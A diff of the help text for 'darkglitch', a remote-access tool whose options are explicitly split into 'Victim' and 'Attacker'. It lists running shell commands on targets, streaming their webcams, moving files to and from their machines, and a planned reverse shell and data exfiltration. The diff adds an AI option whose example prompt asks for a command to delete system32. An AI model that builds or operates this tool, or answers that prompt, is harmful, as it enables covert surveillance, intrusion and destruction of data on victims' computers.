@@ -31,20 +31,6 @@ GENERAL OPTIONS:
   -h, --help                              Display this help message
   -v, --version                           Display version information
 
-CLIENT OPTIONS (Victim):
-  -l, --listen                            Start client listener mode
-  -c, --command                           Enable remote command execution
-  -s, --stream                            Enable webcam streaming capability
-
-SERVER OPTIONS (Attacker):
-  -ol, --online-list                      Display list of connected clients
-  -c, --connect <client_id> <command>     Execute remote command
-  -s, --stream <client_id>                Stream target's webcam
-  -u, --upload <client_id> <src> [dst]    Upload file to target
-                                          (optional: specify remote path)
-  -d, --download <client_id> <src> [dst]  Download file from target
-                                          (optional: specify local path)
-
 ARGUMENTS:
   <client_id>                             Target client identifier
   <command>                               Shell command to execute
@@ -59,19 +45,21 @@ EXAMPLES:
   darkglitch -ol
 
   # Execute command on target client
-  darkglitch -c "client_uuid_here" "whoami"
+  darkglitch -c <client_id> "whoami"
 
   # Stream webcam from target
-  darkglitch -s "client_uuid_here"
+  darkglitch -s <client_id>
 
   # Upload local file to target
-  darkglitch -u "client_uuid_here" "/local/path/file.txt" "/remote/path/"
+  darkglitch -u <client_id> <src> [dst]
 
   # Download file from target
-  darkglitch -d "client_uuid_here" "/remote/path/file.txt" "/local/path/"
+  darkglitch -d <client_id> <src> [dst]
+
+  # AI
+  darkglitch -ai <client_id> "give me a command that can delete system32"
 
 COMING SOON:
-  -ai, --ai-prompt                        AI-powered command generation
   -rc, --reverse-shell                    Establish reverse shell connection
   -ex, --exfiltrate                       Data exfiltration capabilities
 
